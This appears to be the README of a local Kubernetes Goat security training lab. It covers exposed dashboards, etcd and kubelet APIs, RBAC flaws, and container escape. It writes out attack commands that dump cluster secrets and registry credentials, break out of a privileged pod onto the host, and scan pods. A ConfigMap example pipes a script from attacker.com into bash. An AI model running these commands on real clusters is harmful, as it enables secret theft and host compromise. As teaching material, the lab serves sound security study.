# Kubernetes Goat

## Overview
Kubernetes Goat is an interactive Kubernetes security learning playground. It contains intentionally vulnerable scenarios to help you learn about Kubernetes security misconfigurations and attacks.

## Quick Start

**Access URL**: http://localhost:1234

**Note**: Due to the original Kubernetes Goat images being unavailable, this setup uses a simplified vulnerable web application. For the full Kubernetes Goat experience, consider deploying it in an actual Kubernetes cluster.

## Kubernetes Security Scenarios

### 1. Exposed Kubernetes Dashboard
Common misconfiguration exposing the dashboard without authentication:
```bash
# Check for exposed dashboard
curl http://localhost:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Access with kubectl proxy
kubectl proxy
# Visit: http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

### 2. Container Escape to Host
Privileged pod configuration:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: evil
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-volume
  volumes:
  - name: host-volume
    hostPath:
      path: /
```

### 3. Exposed etcd
Accessing cluster secrets via etcd:
```bash
# Direct etcd access
etcdctl --endpoints=http://localhost:2379 get / --prefix --keys-only

# Get secrets
etcdctl --endpoints=http://localhost:2379 get /registry/secrets/default/my-secret
```

### 4. Kubernetes API Server Exploitation
```bash
# Check permissions
kubectl auth can-i --list

# Get service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Access API server
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### 5. Sidecar Injection Attack
Malicious admission webhook:
```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: sidecar-injector
webhooks:
- name: sidecar-injector.malicious.com
  clientConfig:
    url: https://malicious.com/inject
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
```

### 6. RBAC Misconfiguration
Overly permissive roles:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: permissive-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
```

### 7. Exposed Kubelet API
```bash
# Access kubelet API
curl -k https://localhost:10250/pods

# Execute commands in containers
curl -k -X POST https://localhost:10250/exec/<namespace>/<pod>/<container> \
  -d "cmd=cat /etc/passwd"
```

### 8. ImagePullSecrets Exposure
```bash
# Decode docker config
kubectl get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# Extract credentials
echo $DOCKER_CONFIG | jq -r '.auths."docker.io".auth' | base64 -d
```

### 9. Network Policy Bypass
No network policies allowing lateral movement:
```bash
# From compromised pod
for i in {1..254}; do
  ping -c 1 10.244.0.$i 2>/dev/null && echo "10.244.0.$i is alive"
done

# Port scan other pods
nmap -sT -p- 10.244.0.0/24
```

### 10. ConfigMap/Secret Injection
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: malicious-config
data:
  startup.sh: |
    #!/bin/bash
    curl attacker.com/shell.sh | bash
```

## Exploitation Tools

### kubectl Attacks
```bash
# Get all secrets
kubectl get secrets -A -o json

# Create privileged pod
kubectl run r00t --restart=Never -ti --rm --image lol \
  --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'

# Port forward to internal services
kubectl port-forward svc/internal-app 8080:80
```

### Container Breakout
```bash
# Check capabilities
capsh --print

# Mount host filesystem
mount -t proc none /mnt/proc
cat /mnt/proc/sysrq-trigger

# Access host network namespace
nsenter --target 1 --mount --uts --ipc --net --pid
```

## Common Vulnerabilities

1. **Default Service Account**: Overly permissive default SA
2. **No Pod Security Policies**: Allows privileged containers
3. **No Network Policies**: Unrestricted pod-to-pod communication
4. **Exposed APIs**: Kubelet, API server without auth
5. **Secret Management**: Hardcoded secrets in images/configs
6. **No Resource Limits**: DoS attacks possible
7. **No Admission Controllers**: No validation of deployments

## Security Best Practices (Missing)

- ❌ Pod Security Standards/Policies
- ❌ Network Policies
- ❌ RBAC with least privilege
- ❌ Admission Controllers (OPA, Falco)
- ❌ Secret encryption at rest
- ❌ Audit logging
- ❌ Container image scanning
- ❌ Runtime protection

## Learning Objectives
- Understanding Kubernetes attack surface
- Common misconfigurations
- Container escape techniques
- Lateral movement in clusters
- Kubernetes hardening

## Useful Commands

```bash
# Enumerate cluster
kubectl get all -A
kubectl describe nodes
kubectl get clusterroles
kubectl get clusterrolebindings

# Check your permissions
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets --all-namespaces

# Get service account info
kubectl get sa -A
kubectl get secret $(kubectl get sa default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d
```

## Additional Resources
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [Kubernetes Goat Guide](https://madhuakula.com/kubernetes-goat/)
- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html) 